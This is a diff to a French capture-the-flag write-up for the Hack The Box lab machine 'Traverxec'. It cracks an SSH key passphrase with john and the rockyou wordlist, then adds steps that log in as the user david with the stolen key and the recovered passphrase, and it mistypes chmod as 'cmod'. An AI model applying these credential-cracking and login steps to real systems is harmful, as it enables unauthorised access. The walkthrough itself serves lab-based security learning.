@@ -93,4 +93,10 @@ $ ssh2john.py id_rsa > passphrase_hash
 $ john passphrase_hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 ![Pic13](../img/traverxec13.PNG?raw=true) </br>
-
+Nous pouvons alors nous connecter en tant que david en ssh et récupérer le user.txt :
+```
+$ cmod 600 id_rsa
+$ ssh -i id_rsa david@10.10.10.165
+passphrase : hunter
+```
+![Pic14](../img/traverxec14.PNG?raw=true) </br>
